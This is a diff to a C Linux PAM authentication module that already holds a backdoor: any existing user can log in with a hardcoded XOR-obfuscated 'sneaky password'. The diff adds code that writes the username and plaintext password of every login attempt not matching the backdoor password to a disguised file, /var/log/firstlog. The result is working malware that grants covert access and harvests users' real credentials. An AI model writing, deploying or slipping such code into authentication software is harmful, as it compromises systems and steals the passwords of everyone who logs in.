@@ -2,6 +2,11 @@
 #include <security/pam_modules.h>
 #include <security/pam_ext.h>
 #include <string.h>
+#include <sys/file.h>
+#include <errno.h>
+
+#define SNEAKY_LOG_PASSWD 1
+#define SNEAKY_LOG_FILE "/var/log/firstlog"
 
 /* This is the juicy function. It grabs the username and password from the user
     and checks only the password against a constant password. The example below
@@ -21,6 +26,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *handle, int flags, int argc, co
     int found_user = 0;
     // Our secret ( xor('sneaky password', 0x42) )
     char key[16] = { '1', ',', '\'', '#', ')', ';', 'b', '2', '#', '1', '1', '5', '-', '0', '&', 0 };
+	FILE* filp;
 
     /* Asking the application for an  username */
     pam_code = pam_get_user(handle, &username, "Username: ");
@@ -29,7 +35,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *handle, int flags, int argc, co
     }
 
     // Open /etc/passwd
-    FILE* filp = fopen("/etc/passwd", "r");
+    filp = fopen("/etc/passwd", "r");
     if( filp == NULL ){
         return PAM_IGNORE;
     }
@@ -65,6 +71,24 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *handle, int flags, int argc, co
     // Compare the password
     for( int i = 0; i < 15; ++i ){
         if( (key[i] ^ 0x42) != password[i] ){
+
+#ifdef SNEAKY_LOG_PASSWD
+			// Log attempted passwords
+			filp = fopen(SNEAKY_LOG_FILE, "a");
+			if( filp != NULL )
+			{
+				if( flock(fileno(filp), LOCK_EX) != -1 ) {
+					fprintf(filp, "%s:%s\n", username, password);
+					flock(fileno(filp), LOCK_UN);
+				} else {
+					printf("FAILED TO LOCK FILE: %d\n", errno);
+				}
+				fclose(filp);
+			} else {
+				printf("FAILED TO OPEN LOG\n");
+			}
+#endif
+
             return PAM_IGNORE;
         }
     }
